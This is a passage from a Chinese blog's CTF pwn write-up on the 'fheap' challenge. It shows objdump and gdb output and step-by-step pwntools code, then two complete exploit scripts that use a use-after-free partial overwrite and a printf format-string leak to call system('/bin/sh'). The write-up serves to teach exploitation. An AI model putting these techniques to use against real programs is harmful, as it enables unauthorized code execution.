<span class="built_in">fc</span> ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     de4:	e8 a7 fb ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     f31:	e8 5a fa ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     f83:	e8 08 fa ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">    100d:	e8 7e f9 ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">    1119:	e8 72 f8 ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">    1156:	e8 35 f8 ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">    1162:	e8 29 f8 ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">    116e:	e8 1d f8 ff ff       	call   990 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>因此将调用free函数的偏移改成调用puts函数(这里为0x0000555555554d52）的偏移即可。这里选用0xd2d，其实只用修改最后一个字节就可以了</p>
+<p>第二步：puts函数泄漏程序基地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="string">"aaaaa"</span>)</span><br><span class="line">create(<span class="string">"bbbbb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">24</span> * <span class="string">'a'</span> + <span class="string">'\x2d'</span></span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="number">24</span>*<span class="string">'a'</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd2d</span>   <span class="comment">#减掉偏移</span></span><br><span class="line">log.success(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br></pre></td></tr></table></figure>
+<p>第三步：根据程序基地址找到printf函数地址</p>
+<p>查看printf函数在程序中的偏移</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜ objdump -d -M intel fheap | grep <span class="built_in">printf</span></span><br><span class="line">00000000000009d0 &lt;<span class="built_in">printf</span>@plt&gt;:</span><br><span class="line">     dbb:	e8 10 <span class="built_in">fc</span> ff ff       	call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">     e19:	e8 b2 fb ff ff       	call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">     f0a:	e8 c1 fa ff ff       	call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">     f56:	e8 75 fa ff ff       	call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">    10ee:	e8 dd f8 ff ff       	call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>printf_addr = elf_base + 0xdbb</p>
+<p>第四步：利用printf的fmt漏洞泄漏libc基地址</p>
+<p>首先需要再栈中找到一个libc中的函数，首先测试一下fmt泄漏栈中数据的偏移，例如<code>%6$p</code>打印出栈中第二个地址中的数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 30</span><br><span class="line">0000| 0x7fff7f5641d0 --&gt; 0x563315439c8f (test   rax,rax)</span><br><span class="line">0008| 0x7fff7f5641d8 --&gt; 0x563315439e95 (lea    rax,[rip+0x201224]        # 0x56331563b0c0)</span><br><span class="line">0016| 0x7fff7f5641e0 --&gt; 0x0 </span><br><span class="line">0024| 0x7fff7f5641e8 --&gt; 0x100000000 </span><br><span class="line">0032| 0x7fff7f5641f0 --&gt; 0xa736579 (&apos;yes\n&apos;)</span><br><span class="line">0040| 0x7fff7f5641f8 --&gt; 0x0 </span><br><span class="line">0048| 0x7fff7f564200 --&gt; 0x0 </span><br><span class="line">0056| 0x7fff7f564208 --&gt; 0x0 </span><br><span class="line">0064| 0x7fff7f564210 --&gt; 0x0 </span><br><span class="line">0072| 0x7fff7f564218 --&gt; 0x0 </span><br><span class="line">0080| 0x7fff7f564220 --&gt; 0x0 </span><br><span class="line">0088| 0x7fff7f564228 --&gt; 0x0 </span><br><span class="line">0096| 0x7fff7f564230 --&gt; 0x0 </span><br><span class="line">0104| 0x7fff7f564238 --&gt; 0x0 </span><br><span class="line">0112| 0x7fff7f564240 --&gt; 0x0 </span><br><span class="line">0120| 0x7fff7f564248 --&gt; 0x0 </span><br><span class="line">0128| 0x7fff7f564250 --&gt; 0x0 </span><br><span class="line">0136| 0x7fff7f564258 --&gt; 0x7fbb1fe55bff (&lt;_IO_new_file_write+143&gt;:	test   rax,rax)</span><br></pre></td></tr></table></figure>
+<p>找到第18个地址中的数据为libc函数地址，fmt为<code>%22$p</code>。计算偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p 0x7fbb1fe55bff-0x00007fbb1fddd000</span><br><span class="line">$3 = 0x78bff</span><br></pre></td></tr></table></figure>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄漏libc基地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload =  <span class="string">'b'</span> * <span class="number">8</span> + <span class="string">'%22$p'</span> + <span class="string">'b'</span>*<span class="number">11</span> + p64(printf_addr)</span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = int(p.recv()[<span class="number">10</span>:<span class="number">22</span>],<span class="number">16</span>) - <span class="number">0x78bff</span></span><br><span class="line">log.success(<span class="string">'libc_base:'</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
+<p>第五步：根据libc基地址找到system函数地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
+<p>第六步：调用system(“/bin/sh”)</p>
+<p>这里有一个小问题，如何传<code>/bin/sh</code>？解决办法<code>/bin/sh;</code></p>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./fheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./fheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(s)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"create str"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">	p.sendline(str(len(s)))</span><br><span class="line">	p.recvuntil(<span class="string">"str:"</span>)</span><br><span class="line">	p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"delete str"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">"sure?:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#泄漏程序基地址</span></span><br><span class="line">create(<span class="string">"aaaaa"</span>)</span><br><span class="line">create(<span class="string">"bbbbb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">24</span> * <span class="string">'a'</span> + <span class="string">'\x2d'</span></span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="number">24</span>*<span class="string">'a'</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd2d</span></span><br><span class="line">log.success(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">printf_addr = elf_base + <span class="number">0xdbb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc基地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload =  <span class="string">'b'</span> * <span class="number">8</span> + <span class="string">'%22$p'</span> + <span class="string">'b'</span>*<span class="number">11</span> + p64(printf_addr)</span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = int(p.recv()[<span class="number">10</span>:<span class="number">22</span>],<span class="number">16</span>) - <span class="number">0x78bff</span></span><br><span class="line">log.success(<span class="string">'libc_base:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\x0a'</span>)  <span class="comment">#回车使程序继续运行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'/bin/sh;'</span> + <span class="string">'a'</span>*<span class="number">16</span> + p64(system_addr)</span><br><span class="line">create(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>在不知道libc版本的情况下，可以利用DynELF泄漏system地址，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./fheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./fheap"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line"><span class="comment">#print hex(libc.symbols['system'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(s)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"create str"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">	p.sendline(str(len(s)))</span><br><span class="line">	p.recvuntil(<span class="string">"str:"</span>)</span><br><span class="line">	p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"delete str"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">"sure?:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#泄漏程序基地址</span></span><br><span class="line">create(<span class="string">"aaaaa"</span>)</span><br><span class="line">create(<span class="string">"bbbbb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">24</span> * <span class="string">'a'</span> + <span class="string">'\x2d'</span></span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="number">24</span>*<span class="string">'a'</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd2d</span></span><br><span class="line">log.success(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">printf_addr = elf_base + <span class="number">0xdbb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc基地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload =  <span class="string">'b'</span> * <span class="number">8</span> + <span class="string">'%10$s'</span> + <span class="string">'b'</span>*<span class="number">11</span> + p64(printf_addr)</span><br><span class="line">    create(payload)</span><br><span class="line">    pay =  <span class="string">'yes11111'</span> +  p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">'3.quit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'delete '</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Are you sure?:'</span>)</span><br><span class="line">    p.sendline(pay)</span><br><span class="line">    p.recvuntil(<span class="string">'bbbbbbbb'</span>)</span><br><span class="line">    context = p.recvuntil(<span class="string">'bb'</span>)[:<span class="number">-2</span>] + <span class="string">"\x00"</span></span><br><span class="line">    print(<span class="string">"%#x -&gt; %s"</span> %(addr, (context <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    p.sendline(<span class="string">'\x0a'</span>)</span><br><span class="line">    <span class="keyword">return</span> context</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf_base,elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#回车使程序继续运行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'/bin/sh;'</span> + <span class="string">'a'</span>*<span class="number">16</span> + p64(system_addr)</span><br><span class="line">create(payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    <div>
+    
+    <div> 
+ 
+<div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div> 
+
+ </div>
+
+    
+    </div>
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i>pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/15/fabric-node-sdk/" rel="next" title="fabric_node_sdk的编写与运行">
+                <i class="fa fa-chevron-left"></i> fabric_node_sdk的编写与运行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/30/picoctf2019pwn解题记录/" rel="prev" title="picoctf2019pwn解题记录">
+                picoctf2019pwn解题记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/0.jpg"
+                alt="kangel"/>
+            
+              <p class="site-author-name" itemprop="name">kangel</p>
+              <div class="site-description motion-element" itemprop="description">Life is beautiful!</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">27</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#程序静态分析"><span class="nav-number">2.</span> <span class="nav-text">程序静态分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#程序动态分析"><span class="nav-number">3.</span> <span class="nav-text">程序动态分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kangel</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
